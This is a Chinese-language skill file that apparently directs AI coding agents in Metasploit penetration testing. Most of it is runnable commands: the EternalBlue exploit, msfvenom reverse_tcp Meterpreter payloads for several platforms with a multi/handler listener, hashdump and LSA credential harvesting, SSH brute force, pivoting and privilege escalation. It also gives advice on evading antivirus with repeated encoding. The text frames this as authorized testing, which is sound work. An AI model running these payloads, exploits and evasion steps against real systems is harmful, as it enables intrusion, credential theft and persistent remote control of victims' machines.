---
name: metasploit-framework
title: Metasploit 渗透框架
description: 当在书面授权范围内需要用 Metasploit 做漏洞利用、载荷生成与后渗透时使用；做 msfconsole 模块检索/配置、msfvenom 生成多平台载荷、handler 监听、Meterpreter 会话操作与 post 模块采集，产出会话、利用证据与凭据/系统信息；不适用于无授权或超范围测试、纯被动信息收集、纯防御加固。触发词：Metasploit、msfconsole、msfvenom、Meterpreter、exploit、payload、reverse_tcp
domain: 安全/appsec
triggers: [Metasploit, msfconsole, msfvenom, Meterpreter, exploit 利用模块, payload 载荷, reverse_tcp 反弹, multi/handler 监听, ms17_010 永恒之蓝, hashdump 抓取哈希, auxiliary 扫描模块, post 后渗透模块]
tags: [安全, 渗透测试, appsec, 红队, 漏洞利用, Metasploit, 后渗透, 载荷生成]
level: 进阶
status: stable
agents: [claude-code, codex, cursor, gemini-cli]
tools: [Metasploit, msfconsole, msfvenom, Meterpreter, msfdb, db_nmap]
requires: []
related: [penetration-testing-methodology, red-team-recon, pentest-lab-network-services, linux-privilege-escalation]
combines_with: [shodan-reconnaissance, active-directory-attacks, security-incident-response]
license: MIT
source: sickn33/antigravity-awesome-skills
source_license: MIT
---
# Metasploit 渗透框架

> 仅限授权使用：本技能只用于已获书面授权的渗透测试、防御验证或受控教学/靶场环境。运行任何利用模块前，先向用户确认目标主机、范围（scope）与授权状态。无授权或超范围使用均属违法。

用 Metasploit 打通从漏洞利用、载荷生成到后渗透维持的完整链条：统一平台完成漏洞利用、payload 生成、辅助扫描与会话维持。

## 何时使用

适用：
- 已取得书面授权、范围明确，需要对目标做漏洞利用与后渗透验证。
- 需要生成跨平台独立载荷（exe/elf/php/apk/war…）并配监听器回连。
- 已拿到会话，需要用 Meterpreter / post 模块做系统枚举、凭据采集、提权、横向。
- 防御侧复现某 CVE 的可利用性，或靶场教学。

不该用（负边界）：
- 没有书面授权、目标不在 scope 内 —— 任何操作前先确认范围与交战规则。
- 只做被动信息收集 / OSINT —— 用侦察类技能（见互见）。
- 只需做安全加固、合规审计、代码审计 —— 属其他技能范畴。
- 生产环境未审批的破坏性操作（DoS、删改数据、留持久后门）。

前置：Metasploit 已安装（`msfconsole --version` 自检，Kali 通常预装）；网络与系统基础、漏洞/利用概念、目标枚举能力；到授权目标的网络可达性。需数据库工作区时按本地安装文档初始化 `msfdb`，本技能不假定 sudo/systemctl 等特权主机配置。

## 步骤

总体链路：检索模块 → 配置利用 → 设监听 → 触发 → 拿会话 → 后渗透采集 → 留证。

1. **检索模块**：`search` 按名称/CVE/平台/类型/rank 定位 exploit、auxiliary、post。
2. **配置利用**：`use` 选模块，`show options` 看必填项，`set RHOSTS/RPORT/LHOST/LPORT` 与 `set PAYLOAD`，`check` 验证可利用性。
3. **设监听**：反弹型 payload 用 `exploit/multi/handler` 起 listener（`exploit -j` 后台 job）。
4. **触发**：`exploit`/`run` 执行；或在目标上落地 msfvenom 生成的独立载荷回连。
5. **拿会话**：`sessions -l` 列、`sessions -i N` 进入 Meterpreter。
6. **后渗透**：`sysinfo`/`getuid` 摸底 → 文件/进程/网络操作 → `getsystem` 提权 → `hashdump` 等 post 模块采集，`migrate` 到稳定进程保活。
7. **留证与清理**：截图、命令输出、凭据归档作证据；测试后移除植入物，全程可追溯。

原则：能 `check` 先 check、能只读不破坏、所有动作记录、不做计划外测试。

## 指令

**msfconsole 导航**
```bash
msfconsole -q                 # 静默启动（跳过 banner）
msf6 > search type:exploit platform:windows smb   # 组合检索
msf6 > search cve:2017-0144                        # 按 CVE
msf6 > search rank:excellent                       # 按质量过滤
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > info / show options / set [OPT] [val] / setg [OPT] [val]
msf6 > run | exploit | back | sessions -l | jobs -l
```

**模块七类**：exploit（利用）、payload（载荷）、auxiliary（扫描/枚举/爆破）、post（后渗透）、encoder（编码免杀）、nop（填充）、evasion（绕过）。`show <类型>` 列出。

**配置并触发利用**
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > check          # 先验证可利用性（若支持）
msf6 exploit(...) > exploit
```
payload 命名约定：`[平台]/[架构]/[类型]/[连接方式]`，如 `windows/x64/meterpreter/reverse_tcp`、`php/meterpreter/reverse_tcp`。single（自包含）/ stager（小，下载 stage）/ stage（完整功能，如 Meterpreter）三类。

**multi/handler 监听**
```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j      # -j 后台 job，载荷回连即开会话
```

**msfvenom 生成独立载荷**
```bash
# Windows / Linux / PHP / 安卓
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp  LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf
msfvenom -p php/meterpreter/reverse_tcp        LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php
msfvenom -p java/meterpreter/reverse_tcp       LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war   # Tomcat
msfvenom -p android/meterpreter/reverse_tcp    LHOST=192.168.1.50 LPORT=4444 -o shell.apk
# 编码（降低静态检出，非可靠免杀）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o enc.exe
msfvenom --list formats ; msfvenom --list encoders
```

**Meterpreter 后渗透**
```bash
meterpreter > sysinfo / getuid / getpid          # 摸底
meterpreter > ls / cd / download f.txt /tmp/ / upload /tmp/t.exe C:\\   # 文件
meterpreter > ps / migrate [PID] / kill [PID]    # 进程，migrate 提稳保活
meterpreter > ipconfig / netstat / route
meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.1   # 端口转发（pivot）
meterpreter > getsystem / getprivs               # 提权
meterpreter > hashdump                           # 抓哈希
meterpreter > screenshot
meterpreter > shell                              # 落系统 shell
meterpreter > background ; sessions -i 1         # 挂起/切回
```

**auxiliary 扫描 / post 采集**
```bash
msf6 > use auxiliary/scanner/smb/smb_version ; set RHOSTS 192.168.1.0/24 ; run
msf6 > use auxiliary/scanner/portscan/tcp ; set RHOSTS 192.168.1.100 ; set PORTS 1-1000 ; run
msf6 > use auxiliary/scanner/ssh/ssh_login ; set USER_FILE users.txt ; set PASS_FILE rockyou.txt ; run
# post：在活动会话上跑
msf6 > use post/windows/gather/hashdump ; set SESSION 1 ; run
meterpreter > run post/multi/recon/local_exploit_suggester    # 提权建议
```
常用 post：`credentials/credential_collector`、`lsa_secrets`、`enum_logged_on_users`、`enum_shares`、`multi/manage/autoroute`（pivot）。

## 示例

授权内网最小闭环（永恒之蓝）：
1. 扫描：`use auxiliary/scanner/smb/smb_version`，`set RHOSTS 10.0.0.0/24`，`run` → 发现 10.0.0.5 开放 SMBv1。
2. 配置：`use exploit/windows/smb/ms17_010_eternalblue`，`set RHOSTS 10.0.0.5`，`set PAYLOAD windows/x64/meterpreter/reverse_tcp`，`set LHOST 10.0.0.50`。
3. 验证 + 利用：`check` 提示 likely vulnerable → `exploit` 拿到 Meterpreter 会话。
4. 后渗透：`getuid`/`sysinfo` 确认 SYSTEM，`hashdump` 取哈希，`screenshot` 留证。
5. 报告：判为 Critical，给补丁/隔离建议，证据归入技术发现；测试后清理。

落地载荷 + 监听：`msfvenom ... -f exe -o shell.exe` 生成 → 目标执行 → 本地 `multi/handler`（`exploit -j`）回连开会话。

## 注意事项

- **授权先行**：无书面授权不测试，严不越界；操作前确认目标/scope/ROE，发现越权迹象立即上报。
- **证据与保密**：完整记录方法与时间线，发现仅向客户披露，对访问到的数据保密。
- **OPSEC**：尽量用加密信道（`reverse_https`），节奏克制；测试后清理植入物（清理痕迹 = 记日志留证 + 移后门测试文件，而非毁证）。
- **技术限制**：现代 AV/EDR 可检出 MSF 载荷，编码非可靠免杀；防火墙可能挡反弹连接；部分 exploit 仅对特定版本/配置生效。
- **排错速查**：数据库未连 → 按本地文档初始化 `msfdb` 后 `db_connect`；利用失败无会话 → 先 `check` 确认漏洞存在、核对载荷架构、查防火墙、换 payload；会话秒掉 → `migrate` 到稳定进程、用无阶段（stageless）载荷、查 AV、设 AutoRunScript；被 AV 拦 → 提高编码迭代 `-e x86/shikata_ga_nai -i 10`、用 evasion 模块或自定义模板。

## 互见

- requires：`penetration-testing-methodology` —— 先有阶段化方法论与授权流程，再用本技能做利用环节。
- related：`linux-privilege-escalation`、`active-directory-attacks`、`shodan-reconnaissance` —— 提权、域内攻击与资产侦察。
- combines_with：`red-team-recon`、`burp-suite-testing`、`aws-penetration-testing` —— 侦察定位攻击面、Web 专项利用、云上后渗透联动。

---
采编自 sickn33/antigravity-awesome-skills（原 skill：metasploit-framework，作者 zebbern，MIT 许可）。已适配重写为中文，保留关键命令与约束。
